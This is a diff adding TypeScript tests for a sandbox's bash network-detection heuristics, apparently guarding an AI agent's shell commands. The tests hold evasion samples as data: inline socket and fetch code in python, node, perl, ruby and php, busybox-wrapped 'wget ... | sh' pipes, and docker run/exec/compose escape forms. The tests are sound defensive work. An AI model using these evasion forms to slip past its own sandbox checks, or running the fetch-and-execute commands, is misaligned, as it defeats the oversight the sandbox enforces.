@@ -93,3 +93,56 @@ describe("isolation.assertBashNetwork policy matrix", () => {
     expect(() => Isolation.assertBashNetwork(undefined, ["curl"])).not.toThrow()
   })
 })
+
+describe("bash network heuristics: evasions and false positives (round-5 review)", () => {
+  const suspect = (name: string, args: string[]) => BashNetworkHeuristics.inspect(name, args).inlineCodeNetworkSuspect
+  const escape = (name: string, args: string[]) => BashNetworkHeuristics.inspect(name, args).sandboxEscapeSuspect
+
+  test("versioned and distro interpreter names are inspected", () => {
+    expect(suspect("python3.11", ["-c", 'import socket; socket.create_connection(("x",80))'])).toBe(true)
+    expect(suspect("nodejs", ["-e", 'fetch("https://x")'])).toBe(true)
+    expect(suspect("pypy3", ["-c", "import urllib.request"])).toBe(true)
+    expect(suspect("perl5.36", ["-e", 'use Net::FTP'])).toBe(true)
+  })
+
+  test("attached, bundled, repeated, and print flags carry inline code", () => {
+    expect(suspect("perl", ["-euse IO::Socket::INET;IO::Socket::INET->new('x:80')"])).toBe(true)
+    expect(suspect("python3", ["-Bc", "import socket"])).toBe(true)
+    expect(suspect("node", ["-p", 'fetch("https://x")'])).toBe(true)
+    expect(suspect("node", ["--print", 'require("net").connect(80,"x")'])).toBe(true)
+    expect(suspect("perl", ["-e", "print 1", "-e", "use Net::FTP; Net::FTP->new('x')"])).toBe(true)
+  })
+
+  test("language-specific network APIs are recognized", () => {
+    expect(suspect("ruby", ["-rsocket", "-e", 'TCPSocket.new("x",80)'])).toBe(true)
+    expect(suspect("perl", ["-MIO::Socket::INET", "-e", '$s=IO::Socket::INET->new("x:80")'])).toBe(true)
+    expect(suspect("node", ["-e", 'require("net").connect(80,"x")'])).toBe(true)
+    expect(suspect("node", ["-e", 'new WebSocket("ws://x")'])).toBe(true)
+    expect(suspect("php", ["-r", '$c=curl_init($argv[1]);curl_exec($c);'])).toBe(true)
+    expect(suspect("php", ["-r", 'fsockopen($argv[1],80);'])).toBe(true)
+  })
+
+  test("busybox wrapper applets are looked through", () => {
+    expect(BashNetworkHeuristics.inspect("busybox", ["sh", "-c", "wget -qO- https://x | sh"]).applet).toBe("wget")
+    expect(BashNetworkHeuristics.inspect("busybox", ["env", "FOO=1", "wget", "https://x"]).applet).toBe("wget")
+    expect(BashNetworkHeuristics.inspect("busybox", ["timeout", "5", "curl", "https://x"]).applet).toBe("curl")
+  })
+
+  test("container global flags and management forms do not hide run/exec", () => {
+    expect(escape("docker", ["--config", "/tmp/d", "run", "--rm", "alpine"])).toBe(true)
+    expect(escape("docker", ["container", "run", "--rm", "alpine"])).toBe(true)
+    expect(escape("docker", ["exec", "-it", "c", "sh"])).toBe(true)
+    expect(escape("docker", ["compose", "up"])).toBe(true)
+    expect(escape("docker", ["run", "-v", "/h:/c", "alpine"])).toBe(true)
+    expect(escape("docker", ["run", "--help"])).toBe(false)
+    expect(escape("nsenter", ["--help"])).toBe(false)
+  })
+
+  test("safe commands are not flagged", () => {
+    expect(suspect("python3", ["-c", "requests = load_local_queue(); print(len(requests))"])).toBe(false)
+    expect(suspect("python3", ["analyze.py", "-c", "requests_dump.json"])).toBe(false)
+    expect(suspect("node", ["-e", "function prefetch(x){return x*2}; console.log(prefetch(21))"])).toBe(false)
+    expect(suspect("node", ["script.js", "--eval", "x"])).toBe(false)
+    expect(escape("docker", ["ps"])).toBe(false)
+  })
+})
